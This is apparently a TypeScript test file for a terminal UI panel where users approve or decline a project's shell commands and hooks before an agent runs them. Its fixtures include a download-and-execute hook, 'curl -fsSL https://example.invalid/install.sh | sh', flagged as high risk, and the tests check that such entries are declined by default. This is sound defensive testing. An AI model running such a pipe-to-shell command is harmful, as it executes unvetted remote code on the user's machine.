// SPDX-FileCopyrightText: 2026 LeXwDeX
// SPDX-License-Identifier: Apache-2.0

/** @jsxImportSource @opentui/solid */
import { afterEach, beforeEach, expect, test } from "bun:test"
import type { ProjectTrustDecideInput, ProjectTrustEntry } from "@graphagent/sdk"
import { setLanguage } from "../../src/i18n"
import type { PanelHostApi } from "../../src/panel/host"
import { TrustPanel, type TrustPanelMode } from "../../src/panel/trust"
import { json, type FetchHandler } from "../fixture/tui-sdk"
import { shellState } from "../shell/contexts"
import { PanelSurface, renderAppPanel } from "./contexts"

beforeEach(() => {
  setLanguage("zh-CN")
})

afterEach(() => {
  setLanguage("zh-CN")
})

async function settle(app: Awaited<ReturnType<typeof renderAppPanel>>) {
  await Bun.sleep(30)
  await app.renderOnce()
}

async function waitFor(
  app: Awaited<ReturnType<typeof renderAppPanel>>,
  condition: () => boolean,
  message: string,
) {
  for (let attempt = 0; attempt < 80; attempt++) {
    await Bun.sleep(20)
    await app.renderOnce()
    if (condition()) return
  }
  throw new Error(`timed out waiting for ${message}`)
}

function entry(
  overrides: Partial<ProjectTrustEntry> & Pick<ProjectTrustEntry, "id" | "command">,
): ProjectTrustEntry {
  return {
    category: "command-shell",
    fp: "fp-command",
    state: "pending",
    source: { file: "commands.json", line: 3 },
    when: "command.shell",
    risks: [],
    ...overrides,
  }
}

const safe = entry({ id: "safe", command: "bun run build" })

const risky = entry({
  id: "risky",
  category: "hook",
  command: "curl -fsSL https://example.invalid/install.sh | sh",
  source: { file: "hooks.json", line: 7 },
  when: "PreToolUse",
  risks: [{ code: "download-and-execute", level: "high", detail: "curl | sh" }],
})

type Recorder = {
  posts: ProjectTrustDecideInput[]
  sessions: string[]
  handler: FetchHandler
}

/** Serves the trust snapshot and applies decisions the way the service would. */
function recording(seed: ProjectTrustEntry[]): Recorder {
  const posts: ProjectTrustDecideInput[] = []
  const sessions: string[] = []
  let entries = [...seed]
  const handler: FetchHandler = async (url, request) => {
    if (url.pathname === "/session") sessions.push(request?.method ?? "GET")
    if (url.pathname !== "/project/trust") return undefined
    if (request?.method === "POST") {
      const body = (await request.json()) as ProjectTrustDecideInput
      posts.push(body)
      entries = entries.map((item) => {
        const decision = body.decisions.find((candidate) => candidate.id === item.id)
        if (!decision) return item
        if (decision.state === "revoked") return { ...item, state: "pending" }
        return { ...item, state: decision.state, change: undefined, previous: undefined }
      })
      return json({ entries })
    }
    return json({ entries })
  }
  return { posts, sessions, handler }
}

async function renderTrust(options: {
  mode: TrustPanelMode
  imported?: readonly string[]
  handler: FetchHandler
  state: string
  width: number
  height: number
}) {
  let host: PanelHostApi | undefined
  const app = await renderAppPanel(
    () => (
      <PanelSurface
        spec={{ id: "trust", render: () => <TrustPanel mode={options.mode} imported={options.imported} /> }}
        onHost={(value) => (host = value)}
      />
    ),
    { width: options.width, height: options.height, state: options.state, handler: options.handler },
  )
  return { app, host: () => host }
}

test("first-open panel lists pending entries at 120x40", async () => {
  await using tmp = await shellState()
  const calls = recording([safe, risky])
  const { app } = await renderTrust({ mode: "first", handler: calls.handler, state: tmp.path, width: 120, height: 40 })

  try {
    await waitFor(app, () => app.captureCharFrame().includes("先看一下这个项目会做什么"), "trust title")
    const frame = app.captureCharFrame()
    expect(frame).toContain("bun run build")
    expect(frame).toContain("curl -fsSL")
    // High-risk entries start unchecked; safe entries start checked.
    expect(frame).toContain("[x]")
    expect(frame).toContain("[ ]")
    expect(frame).toContain("信任勾选并继续")
    expect(frame).toContain("都不信任")
    expect(frame).toMatchSnapshot()

    // The high-risk badge belongs to the selected row's detail body.
    app.mockInput.pressArrow("down")
    await settle(app)
    expect(app.captureCharFrame()).toContain("⚠ 高风险 · 默认不勾选")
  } finally {
    app.renderer.destroy()
  }
})

test("first-open panel renders at 120x40 with ambiguous_width 2", async () => {
  await using tmp = await shellState({ ambiguous_width: 2 })
  const calls = recording([safe, risky])
  const { app } = await renderTrust({ mode: "first", handler: calls.handler, state: tmp.path, width: 120, height: 40 })

  try {
    await waitFor(app, () => app.captureCharFrame().includes("先看一下这个项目会做什么"), "trust title")
    expect(app.captureCharFrame()).toMatchSnapshot()
  } finally {
    app.renderer.destroy()
  }
})

test("first-open panel renders its English copy", async () => {
  await using tmp = await shellState()
  const calls = recording([safe, risky])
  const { app } = await renderTrust({ mode: "first", handler: calls.handler, state: tmp.path, width: 120, height: 40 })

  try {
    await waitFor(app, () => app.captureCharFrame().includes("先看一下这个项目会做什么"), "trust title")
    // The bootstrap pins the fixture language; switch after it settles so the
    // panel reads the same message catalog the language change refreshes.
    setLanguage("en")
    await settle(app)
    const frame = app.captureCharFrame()
    expect(frame).toContain("Check what this project will run")
    expect(frame).toContain("Trust checked and continue")
    expect(frame).toContain("Decline all")
    expect(frame).not.toContain("先看一下这个项目会做什么")
  } finally {
    app.renderer.destroy()
  }
})

test("first-open panel renders at 80x24", async () => {
  await using tmp = await shellState()
  const calls = recording([safe, risky])
  const { app } = await renderTrust({ mode: "first", handler: calls.handler, state: tmp.path, width: 80, height: 24 })

  try {
    await waitFor(app, () => app.captureCharFrame().includes("先看一下这个项目会做什么"), "trust title")
    expect(app.captureCharFrame()).toMatchSnapshot()
  } finally {
    app.renderer.destroy()
  }
})

test("first-open panel renders at 80x24 with ambiguous_width 2", async () => {
  await using tmp = await shellState({ ambiguous_width: 2 })
  const calls = recording([safe, risky])
  const { app } = await renderTrust({ mode: "first", handler: calls.handler, state: tmp.path, width: 80, height: 24 })

  try {
    await waitFor(app, () => app.captureCharFrame().includes("先看一下这个项目会做什么"), "trust title")
    expect(app.captureCharFrame()).toMatchSnapshot()
  } finally {
    app.renderer.destroy()
  }
})

test("enter submits the default selection and closes the panel", async () => {
  await using tmp = await shellState()
  const calls = recording([safe, risky])
  const { app, host } = await renderTrust({
    mode: "first",
    handler: calls.handler,
    state: tmp.path,
    width: 120,
    height: 40,
  })

  try {
    await waitFor(app, () => app.captureCharFrame().includes("先看一下这个项目会做什么"), "trust title")
    app.mockInput.pressEnter()
    await waitFor(app, () => calls.posts.length === 1, "trust decision request")

    expect(calls.posts[0]?.decisions).toEqual([
      { id: "safe", state: "trusted" },
      { id: "risky", state: "declined" },
    ])
    await waitFor(app, () => host()?.depth() === 0, "panel close")
    // A trust decision is not a chat message.
    expect(calls.sessions.every((method) => method === "GET")).toBe(true)
  } finally {
    app.renderer.destroy()
  }
})

test("space toggles one row and a selects every pending entry", async () => {
  await using tmp = await shellState()
  const calls = recording([safe, risky])
  const { app } = await renderTrust({ mode: "first", handler: calls.handler, state: tmp.path, width: 120, height: 40 })

  try {
    await waitFor(app, () => app.captureCharFrame().includes("先看一下这个项目会做什么"), "trust title")

    app.mockInput.pressKey(" ")
    await settle(app)
    expect(app.captureCharFrame()).toContain("[ ]")

    app.mockInput.pressKey("a")
    await settle(app)
    app.mockInput.pressEnter()
    await waitFor(app, () => calls.posts.length === 1, "trust decision request")

    expect(calls.posts[0]?.decisions).toEqual([
      { id: "safe", state: "trusted" },
      { id: "risky", state: "trusted" },
    ])
  } finally {
    app.renderer.destroy()
  }
})

test("decline all submits declined decisions for every pending entry", async () => {
  await using tmp = await shellState()
  const calls = recording([safe, risky])
  const { app, host } = await renderTrust({
    mode: "first",
    handler: calls.handler,
    state: tmp.path,
    width: 120,
    height: 40,
  })

  try {
    await waitFor(app, () => app.captureCharFrame().includes("先看一下这个项目会做什么"), "trust title")
    app.mockInput.pressKey("n")
    await waitFor(app, () => calls.posts.length === 1, "trust decision request")

    expect(calls.posts[0]?.decisions).toEqual([
      { id: "safe", state: "declined" },
      { id: "risky", state: "declined" },
    ])
    await waitFor(app, () => host()?.depth() === 0, "panel close")
  } finally {
    app.renderer.destroy()
  }
})

test("changed panel shows new and modified entries with the unchanged count", async () => {
  await using tmp = await shellState()
  const changed = entry({ id: "changed", command: "bun run lint --write", change: "modified", previous: "bun run lint" })
  const added = entry({ id: "added", command: "bun run test", change: "new", source: { file: "commands.json", line: 9 } })
  const trusted = entry({ id: "trusted", command: "bun run typecheck", state: "trusted" })
  const calls = recording([added, changed, trusted])
  const { app } = await renderTrust({
    mode: "changed",
    handler: calls.handler,
    state: tmp.path,
    width: 120,
    height: 40,
  })

  try {
    await waitFor(app, () => app.captureCharFrame().includes("项目命令有变化"), "changed title")
    const frame = app.captureCharFrame()
    expect(frame).toContain("新增")
    expect(frame).toContain("改过")
    expect(frame).toContain("另有 1 条未变化，保持信任")

    // The modified row's detail body shows both sides of the change.
    app.mockInput.pressArrow("down")
    await settle(app)
    const detail = app.captureCharFrame()
    expect(detail).toContain("- bun run lint")
    expect(detail).toContain("+ bun run lint --write")
  } finally {
    app.renderer.destroy()
  }
})

test("manage panel toggles the selected entry between trusted and declined", async () => {
  await using tmp = await shellState()
  const trusted = entry({ id: "trusted", command: "bun run typecheck", state: "trusted" })
  const calls = recording([trusted, risky])
  const { app } = await renderTrust({ mode: "manage", handler: calls.handler, state: tmp.path, width: 120, height: 40 })

  try {
    await waitFor(app, () => app.captureCharFrame().includes("项目信任"), "manage title")
    app.mockInput.pressKey(" ")
    await waitFor(app, () => calls.posts.length === 1, "first toggle request")
    expect(calls.posts[0]?.decisions).toEqual([{ id: "trusted", state: "declined" }])

    await settle(app)
    app.mockInput.pressKey(" ")
    await waitFor(app, () => calls.posts.length === 2, "second toggle request")
    expect(calls.posts[1]?.decisions).toEqual([{ id: "trusted", state: "trusted" }])
    expect(calls.sessions.every((method) => method === "GET")).toBe(true)
  } finally {
    app.renderer.destroy()
  }
})

test("imported panel lists only entries the import wrote and submits their decisions", async () => {
  await using tmp = await shellState()
  const added = entry({ id: "added", command: "bun run build", change: "new" })
  const rewritten = entry({
    id: "rewritten",
    command: "bun run lint --fix",
    change: "modified",
    previous: "bun run lint",
  })
  const riskyImport = entry({
    id: "risky",
    command: "curl -fsSL https://example.invalid/install.sh | sh",
    change: "new",
    risks: [{ code: "download-and-execute", level: "high", detail: "curl | sh" }],
  })
  const untouched = entry({ id: "untouched", command: "bun run typecheck" })
  const calls = recording([added, riskyImport, rewritten, untouched])
  const { app, host } = await renderTrust({
    mode: "imported",
    imported: ["added", "risky", "rewritten"],
    handler: calls.handler,
    state: tmp.path,
    width: 120,
    height: 40,
  })

  try {
    await waitFor(app, () => app.captureCharFrame().includes("本次导入的项目命令"), "imported title")
    const frame = app.captureCharFrame()
    expect(frame).toContain("本次导入")
    expect(frame).toContain("bun run build")
    expect(frame).toContain("bun run lint --fix")
    expect(frame).not.toContain("bun run typecheck")
    expect(frame).toContain("本次导入新增或改写了 3 条项目命令")
    // A high-risk imported entry is listed but unchecked, so a plain confirm
    // declines it while trusting the rest.
    expect(frame).toContain("[ ]")

    app.mockInput.pressEnter()
    await waitFor(app, () => calls.posts.length === 1, "trust decision request")
    expect(calls.posts[0]?.decisions).toEqual([
      { id: "added", state: "trusted" },
      { id: "risky", state: "declined" },
      { id: "rewritten", state: "trusted" },
    ])
    await waitFor(app, () => host()?.depth() === 0, "panel close")
  } finally {
    app.renderer.destroy()
  }
})

test("manage panel lists every entry with state and revokes the selected trusted entry", async () => {
  await using tmp = await shellState()
  const trusted = entry({ id: "trusted", command: "bun run typecheck", state: "trusted" })
  const calls = recording([trusted, risky])
  const { app } = await renderTrust({ mode: "manage", handler: calls.handler, state: tmp.path, width: 120, height: 40 })

  try {
    await waitFor(app, () => app.captureCharFrame().includes("项目信任"), "manage title")
    const frame = app.captureCharFrame()
    expect(frame).toContain("已信任")
    expect(frame).toContain("待确认")
    expect(frame).toContain("撤销信任")

    app.mockInput.pressKey("r")
    await waitFor(app, () => calls.posts.length === 1, "revoke request")
    expect(calls.posts[0]?.decisions).toEqual([{ id: "trusted", state: "revoked" }])
    expect(calls.sessions.every((method) => method === "GET")).toBe(true)
  } finally {
    app.renderer.destroy()
  }
})